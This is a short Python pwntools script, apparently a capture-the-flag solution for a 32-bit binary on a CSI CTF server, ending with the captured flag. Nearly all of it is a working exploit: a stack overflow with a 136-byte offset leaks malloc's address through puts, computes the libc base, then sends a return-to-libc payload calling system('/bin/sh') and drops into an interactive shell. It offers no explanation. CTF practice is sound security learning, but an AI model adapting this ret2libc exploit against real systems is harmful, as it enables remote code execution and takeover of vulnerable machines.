from pwn import *

exe = ELF("hello")
libc = ELF("libc.so.6")
HOST = "chall.csivit.com"
PORT = 30046
p = remote(HOST, PORT)

p.recvline()
offset = 136
log.info("sending the first payload...")
payload = b"M" * offset
payload += p32(exe.plt["puts"])
payload += p32(exe.sym["main"])
payload += p32(exe.got["malloc"])
p.sendline(payload)
log.info("first payload done")
sleep(1.5)

log.info("leak libc_base...")
p.recvuntil("!\n")
malloc = u32(p.recv(4))
libc_base = malloc - libc.sym["malloc"]
log.success("Libc base address --> %s", hex(libc_base))
log.info("libc base leaked")
sleep(1.5)

system = libc_base + libc.sym["system"]
log.success("system --> 0x%x" % system)
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
sleep(1.5)

log.info("sending the second payload...")
payload = b"A" * offset
payload += p32(system)
payload += b"AAAA"
payload += p32(bin_sh)
p.recvlines(2)
p.sendline(payload)
log.info("second payload done")
sleep(1.5)

p.recvuntil('!\n')
log.info("spawning shell...")
sleep(1)
p.interactive()

# FLAG --> csictf{5up32_m4210_5m45h_8202}
